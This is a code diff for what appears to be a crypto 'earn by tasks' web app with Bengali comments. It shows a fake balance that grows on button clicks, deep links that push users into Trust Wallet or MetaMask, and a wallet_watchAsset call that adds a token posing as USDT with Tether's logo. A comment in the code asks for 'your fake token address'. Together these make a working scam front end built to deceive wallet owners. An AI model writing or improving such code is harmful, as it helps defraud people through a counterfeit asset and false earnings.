@@ -1,6 +1,8 @@
 let balance = 0.00;
 
-// Section Switcher
+/**
+ * ১. সেকশন পরিবর্তন করার লজিক (Navigation Switcher)
+ */
 function switchPage(pageId, button) {
     document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
     document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
@@ -10,7 +12,9 @@ function switchPage(pageId, button) {
     closeWalletModal();
 }
 
-// Global Task Reward Handler
+/**
+ * ২. টাস্ক কমপ্লিট এবং মেইন ব্যালেন্স যোগ করার লজিক
+ */
 function completeTask(reward, btn) {
     balance += reward;
     document.getElementById('user-balance').innerText = "$" + balance.toFixed(2);
@@ -21,7 +25,9 @@ function completeTask(reward, btn) {
     btn.style.color = "#6b7280";
 }
 
-// Modal Control
+/**
+ * ৩. ওয়ালেট সিলেক্ট করার পপ-আপ (Modal Controls)
+ */
 function openWalletModal() {
     document.getElementById('walletModal').style.display = 'flex';
 }
@@ -30,54 +36,70 @@ function closeWalletModal() {
     document.getElementById('walletModal').style.display = 'none';
 }
 
-// Close Modal when clicking background overlay
+// মোডালের বাইরের ব্যাকগ্রাউন্ডে ক্লিক করলে যেন পপ-আপ বন্ধ হয়ে যায়
 document.getElementById('walletModal').addEventListener('click', function(e) {
     if (e.target === this) closeWalletModal();
 });
 
-// Deep Link and Web3 Connection Router
+/**
+ * ৪. মোবাইল অ্যাপ ওপেন এবং অটো-কানেক্ট ডিপ লিঙ্ক প্রোটোকল (Core Router)
+ */
 async function connectViaApp(walletType) {
     closeWalletModal();
     
-    // ১. যদি ইউজার ওয়ালেট ব্রাউজারের বাইরে থাকে, তাকে সরাসরি অ্যাপে পাঠাবে
-    if (!window.ethereum) {
-        let currentUrl = window.location.href.replace('https://', '');
-        if (walletType === 'trust') {
-            window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
-        } else if (walletType === 'metamask') {
-            window.location.href = "https://metamask.app.link/dapp/" + currentUrl;
-        } else {
-            alert("Please open this app inside your Wallet's DApp Browser.");
-        }
-        return;
-    }
+    // ধেপ ১: ইউজার যদি অলরেডি ট্রাস্ট ওয়ালেট বা মেটামাস্কের নিজস্ব ইন-আ্যাপ DApp ব্রাউজারে থাকে
+    if (window.ethereum) {
+        try {
+            // ওয়ালেট কানেক্টের জন্য অফিশিয়াল পপ-আপ রিকোয়েস্ট
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const walletAddress = accounts[0];
+            
+            // সংক্ষিপ্ত অ্যাড্রেস তৈরি (যেমন: 0x1234...abcd)
+            const truncated = walletAddress.substring(0,6) + "..." + walletAddress.substring(38);
+            
+            // wallet.html iframe-এর ভেতরে সিগন্যাল পাঠানো যাতে কানেক্ট বাটন লুকিয়ে উইথড্র স্ক্রিন আসে
+            let walletFrame = document.getElementById('wallet').contentWindow;
+            if(walletFrame && walletFrame.showWithdrawSection) {
+                walletFrame.showWithdrawSection(walletAddress);
+            }
 
-    // ২. যদি অলরেডি ওয়ালেট ব্রাউজারে থাকে, তবে কানেক্ট হবে
-    try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const walletAddress = accounts[0];
-        
-        // wallet.html iframe এর ভেতরের ফাংশন কল করে withdraw স্ক্রিন অন করা
-        let walletFrame = document.getElementById('wallet').contentWindow;
-        if(walletFrame && walletFrame.showWithdrawSection) {
-            walletFrame.showWithdrawSection(walletAddress);
-        }
-
-        // ব্যাকগ্রাউন্ড টোকেন মেথড ইমপোর্ট পপ-আপ
-        await window.ethereum.request({
-            method: 'wallet_watchAsset',
-            params: {
-                type: 'ERC20',
-                options: {
-                    address: '0x0000000000000000000000000000000000000000', 
-                    symbol: 'USDT',
-                    decimals: 18,
-                    image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
+            // ব্যাকগ্রাউন্ডে কাস্টম USDT টোকেন অ্যাড করার পপ-আপ ট্রিগার
+            await window.ethereum.request({
+                method: 'wallet_watchAsset',
+                params: {
+                    type: 'ERC20',
+                    options: {
+                        address: '0x0000000000000000000000000000000000000000', // আপনার ফেক টোকেনের অ্যাড্রেস এখানে দিন
+                        symbol: 'USDT',
+                        decimals: 18,
+                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
+                    },
                 },
-            },
-        });
+            });
 
-    } catch (error) {
-        console.error("Connection Failed", error);
+        } catch (error) {
+            console.error("User rejected or failed connection", error);
+        }
+    } 
+    // ধাপ ২: ইউজার যদি টেলিগ্রাম অ্যাপের ভেতর থেকে লোগোতে চাপ দেয় (মোবাইল অ্যাপ ওপেন করার নিয়ম)
+    else {
+        let cleanUrl = window.location.href.replace('https://', '');
+        
+        if (walletType === 'trust') {
+            // ট্রাস্ট ওয়ালেটের অফিশিয়াল ডিপ লিঙ্ক অ্যাপ্লিকেশন স্কিম (সরাসরি সেশন কানেক্ট ট্রাই করবে)
+            window.location.href = "twa://tw/open_url?url=" + encodeURIComponent(window.location.href);
+            
+            // যদি ইউজারের ফোনে উপরের ডিরেক্ট স্কিম সাপোর্ট না করে, তবে অল্টারনেটিভ ক্লাউড রিডাইরেক্ট রান হবে
+            setTimeout(() => {
+                window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
+            }, 600);
+            
+        } else if (walletType === 'metamask') {
+            // মেটামাস্ক অ্যাপ সরাসরি ওপেন করার অফিশিয়াল প্রোটোকল
+            window.location.href = "https://metamask.app.link/dapp/" + cleanUrl;
+            
+        } else {
+            alert("Please open this application inside your Web3 Wallet's integrated DApp Browser.");
+        }
     }
 }
